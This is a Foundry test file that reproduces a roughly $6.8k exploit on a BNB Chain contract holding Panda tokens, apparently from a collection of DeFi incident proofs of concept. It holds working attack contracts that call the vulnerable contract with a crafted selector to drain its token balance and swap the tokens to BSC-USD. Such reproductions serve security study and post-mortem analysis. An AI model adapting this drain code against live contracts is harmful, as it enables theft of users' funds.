pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : $6.8k
// Attacker : https://bscscan.com/address/0xcc116696f9852c238a5c8d3d96418ddba02357fc
// Attack Contract : https://bscscan.com/address/0x62f57a14c2e8f3ac9db05b81c8170d60f91f1b7a, https://bscscan.com/address/0x86e9f4ca67e72312f5ed668d2fbebc5dc65e9e52
// Vulnerable Contract : https://bscscan.com/address/0x12050e4355a392162698c6cf30eb8c9e0777300d
// Attack Tx : https://app.blocksec.com/explorer/tx/bsc/0x00e4bbc86369d67e21b1910c4f9178c8257ce96192039a7839bd4d3593e1cd27

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x12050e4355a392162698c6cf30eb8c9e0777300d

// @Analysis
// Post-mortem : https://x.com/TenArmorAlert/status/1833825098962550802
// Twitter Guy : https://x.com/TenArmorAlert/status/1833825098962550802
// Hacking God : N/A


address constant PandaToken = 0x4E93bFCD6378e564C454bF99E130AE10a1C7b2dd;
address constant PancakeRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
address constant attacker = 0xCC116696F9852C238A5c8D3d96418ddBa02357fc;
address constant bsc_usd = 0x55d398326f99059fF775485246999027B3197955;
address constant addr = 0x12050E4355a392162698C6cF30eB8c9e0777300d;

contract ContractTest is Test {
    function setUp() public {
        vm.createSelectFork("bsc", 42157592 - 1);
    }
    
    function testPoC() public {
        emit log_named_decimal_uint("before attack: balance of attacker", IERC20(0x55d398326f99059fF775485246999027B3197955).balanceOf(attacker), 18);
        vm.startPrank(attacker, attacker);
        AttackerC attC = new AttackerC();
        vm.stopPrank();
        emit log_named_decimal_uint("after attack: balance of attacker", IERC20(0x55d398326f99059fF775485246999027B3197955).balanceOf(attacker), 18);
    }
}

contract AttackerC {
    constructor() {
        AddrCC a1 = new AddrCC();
        a1.process(PandaToken, bsc_usd);
    } 
}

contract AddrCC {
    constructor() {}

    function process(address tokenIn, address tokenOut) external {
        (bool ok1, bytes memory ret1) = tokenIn.staticcall(abi.encodeWithSelector(IERC20(tokenIn).balanceOf.selector, addr));
        require(ok1 && ret1.length >= 32, "balanceOf failed");
        uint256 bal = abi.decode(ret1, (uint256));

        bytes memory data = abi.encodeWithSelector(bytes4(0x008ea502), uint256(96), bal, address(this), uint256(3), bytes32(hex"4149520000000000000000000000000000000000000000"));
        (bool ok2,) = addr.call(data);
        require(ok2, "addr call failed");

        (bool ok3, bytes memory ret3) = tokenIn.staticcall(abi.encodeWithSelector(IERC20(tokenIn).balanceOf.selector, address(this)));
        require(ok3 && ret3.length >= 32, "balanceOf this failed");
        uint256 amt = abi.decode(ret3, (uint256));

        (bool ok4,) = tokenIn.call(abi.encodeWithSelector(IERC20(tokenIn).approve.selector, PancakeRouter, amt));
        require(ok4, "approve failed");

        address[] memory path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;
        (bool ok5,) = PancakeRouter.call(
            abi.encodeWithSelector(
                bytes4(keccak256("swapExactTokensForTokensSupportingFeeOnTransferTokens(uint256,uint256,address[],address,uint256)")),
                amt,
                0,
                path,
                tx.origin,
                block.timestamp
            )
        );
        require(ok5, "swap failed");
    }
}

interface IPandaToken {
	function approve(address, uint256) external returns (bool);
	function balanceOf(address) external returns (uint256); 
}